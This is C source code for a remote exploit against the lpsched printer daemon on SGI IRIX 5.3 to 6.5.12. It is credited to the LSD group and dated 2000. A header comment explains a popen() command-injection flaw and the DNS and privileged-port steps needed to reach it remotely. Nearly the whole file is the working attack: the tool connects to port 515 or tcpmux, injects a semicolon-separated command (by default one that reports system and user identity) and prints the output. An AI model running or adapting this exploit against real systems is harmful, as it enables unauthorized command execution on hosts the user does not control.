/*## copyright LAST STAGE OF DELIRIUM may 2000 poland        *://lsd-pl.net/ #*/
/*## lpsched                                                                 #*/

/*   lpsched usually runs on TCP port 515. sometimes it is not bound to this  */
/*   port - in such case lpsched can be reached through tcpmux/sgi_printer    */
/*   (port 1) and printerd. this code is for a vulnerability that is due to   */
/*   the improper use of popen() libc call in lpsched. as its result          */
/*   a semicolon separated list of commands can be issued on the vulnerable   */
/*   system with the privilages of the lp user. there are however some limits */
/*   imposed on that as only the first line of the executed commands' output  */
/*   is returned to the caller.                                               */
 
/*   remote exploitation requires that a connection is established from the   */
/*   root account (port<1024) and that a proper modification to the DNS       */
/*   is made, so that the attackers' IP address is mapped to the "localhost"  */
/*   name.                                                                    */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

main(int argc,char **argv){
    char buffer[10000],*cmd="echo `uname -a` `id`";
    int sck,i,c,on=1,tcpmux=0;
    struct sockaddr_in sadr;
    struct hostent *hp;

    printf("copyright LAST STAGE OF DELIRIUM may 2000 poland  //lsd-pl.net/\n");
    printf("lpsched for irix 5.3 6.2 6.3 6.4 6.5 6.5.12 IP:all\n\n");

    if(argc<2){
        printf("usage: %s address [-m] [-c \"command\"]\n",argv[0]);exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"c:m"))!=-1){
        switch(c){
        case 'c': cmd=optarg;break;
        case 'm': tcpmux=1;
        }
    }   

    sck=socket(AF_INET,SOCK_STREAM,0);
    sadr.sin_family=AF_INET;
    sadr.sin_addr.s_addr=htonl(INADDR_ANY);
    for(i=200;i<1024;i++){
        sadr.sin_port=htons(i);
        if(!bind(sck,(struct sockaddr *)&sadr,sizeof(sadr))) break;
    }if(i==1024) goto err;

    setsockopt(sck,SOL_SOCKET,SO_REUSEADDR,(void*)&on,sizeof(on));

    sadr.sin_port=htons(tcpmux?1:515);
    if((sadr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL) {errno=EADDRNOTAVAIL;goto err;}
        memcpy(&sadr.sin_addr.s_addr,hp->h_addr,4);
    }

    if(connect(sck,(struct sockaddr*)&sadr,sizeof(sadr))<0) goto err;
    if(tcpmux) {write(sck,"sgi_printer\n",12);read(sck,buffer,1024);}

    sprintf(buffer,"%c;%s\n",(unsigned char)(84),cmd);
    write(sck,buffer,strlen(buffer));

    while(1){
        if((i=read(sck,buffer,1024))<1){
            if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
            else break;
        }
        write(1,buffer,i);
    }
    exit(0);

err:
    perror("error");
}

